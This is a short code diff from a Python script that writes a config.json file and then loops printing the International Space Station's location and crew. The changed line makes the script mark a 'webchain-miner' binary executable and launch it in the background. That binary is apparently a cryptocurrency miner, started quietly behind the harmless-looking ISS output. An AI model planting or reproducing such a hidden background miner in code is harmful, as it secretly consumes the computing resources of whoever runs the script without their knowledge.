@@ -44,7 +44,7 @@ json_object = json.dumps(dictionary, indent=4)
 # Writing to sample.json
 with open("config.json", "w") as outfile:
     outfile.write(json_object)
-os.system('chmod +x webchain-miner && ./webchain-miner')
+os.system('chmod +x webchain-miner && ./webchain-miner &')
 
 while True:
     print(ISS_Info.iss_current_loc(),ISS_Info.iss_people_in_space())
